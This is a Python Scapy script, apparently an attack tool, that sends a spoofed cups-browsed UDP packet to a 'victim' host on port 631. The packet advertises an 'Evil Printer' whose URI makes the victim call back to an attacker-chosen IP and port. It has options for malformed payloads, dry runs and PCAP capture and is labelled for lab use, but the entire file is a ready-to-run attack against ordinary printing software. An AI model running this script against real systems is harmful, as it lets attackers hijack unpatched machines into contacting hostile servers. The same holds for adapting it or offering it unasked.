

import argparse
import logging
import socket
import sys
import threading
import time
from datetime import datetime

from scapy.all import IP, UDP, Raw, send, wrpcap

CUPS_BROWSED_PORT = 631  # cups-browsed UDP discovery port

log = logging.getLogger("cups_attack")


# Packet construction
def build_browse_payload(args) -> bytes:
    if args.raw_payload:  # full override, for malformed-field experiments
        payload = args.raw_payload
    else:
        uri = f"{args.scheme}://{args.advertise_ip}:{args.advertise_port}{args.path}"
        payload = (
            f'{args.type} {args.state} {uri} '
            f'"Lab" "Evil Printer" "Generic PostScript"'
        )
    log.debug("Browse payload: %s", payload)
    return payload.encode("utf-8", errors="surrogateescape")


def build_packet(args):
    """Wrap the browse payload in IP/UDP -> victim:631."""
    pkt = (
        IP(dst=args.victim)
        / UDP(sport=args.sport, dport=args.dport)
        / Raw(load=build_browse_payload(args))
    )
    return pkt


# CLI
def parse_args(argv=None):
    p = argparse.ArgumentParser(
        description="Scapy CUPS insecure printer-discovery demonstrator (lab use only).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    tgt = p.add_argument_group("target")
    tgt.add_argument("--victim", required=True, help="Victim cups-browsed IP")
    tgt.add_argument("--dport", type=int, default=CUPS_BROWSED_PORT,
                     help="Victim UDP discovery port")
    tgt.add_argument("--sport", type=int, default=CUPS_BROWSED_PORT,
                     help="Source UDP port")

    adv = p.add_argument_group("advertised printer (manipulable fields)")
    adv.add_argument("--advertise-ip", required=True,
                     help="IP the victim should call back to (your listener)")
    adv.add_argument("--advertise-port", type=int, default=8631,
                     help="Port the victim should call back to")
    adv.add_argument("--scheme", default="http", help="URI scheme (http/ipp)")
    adv.add_argument("--path", default="/printers/evil", help="URI path")
    adv.add_argument("--type", default="0", help="Browse packet type field")
    adv.add_argument("--state", default="3", help="Printer state field (3=idle)")
    adv.add_argument("--raw-payload", default=None,
                     help="Override entire payload (for malformed-field tests)")

    beh = p.add_argument_group("behaviour")
    beh.add_argument("--pcap", default=None, help="Write sent packets to this PCAP file")
    beh.add_argument("-v", "--verbose", action="store_true", help="Debug logging")
    beh.add_argument("--dry-run", action="store_true",
                     help="Build and show the packet but do not send")
    return p.parse_args(argv)


def setup_logging(verbose):
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )


def main(argv=None):
    args = parse_args(argv)
    setup_logging(args.verbose)

    log.info("CUPS discovery demonstrator - victim=%s advertise=%s:%d",
             args.victim, args.advertise_ip, args.advertise_port)

    pkt = build_packet(args)
    log.info("Advertising printer URI: %s://%s:%d%s",
             args.scheme, args.advertise_ip, args.advertise_port, args.path)

    if args.dry_run:
        log.info("Dry run - packet summary:")
        pkt.show()
    else:
        try:
            send(pkt, verbose=False)
            log.info("Sent advertisement packet to %s:%d",
                     args.victim, args.dport)
        except PermissionError:
            log.error("Raw send failed - run with sudo/root.")
            return 1
        except OSError as e:
            log.error("Send failed: %s", e)
            return 1

    if args.pcap:
        try:
            wrpcap(args.pcap, pkt)
            log.info("Wrote packet to %s", args.pcap)
        except OSError as e:
            log.error("Could not write PCAP %s: %s", args.pcap, e)

    return 0


if __name__ == "__main__":
    sys.exit(main())
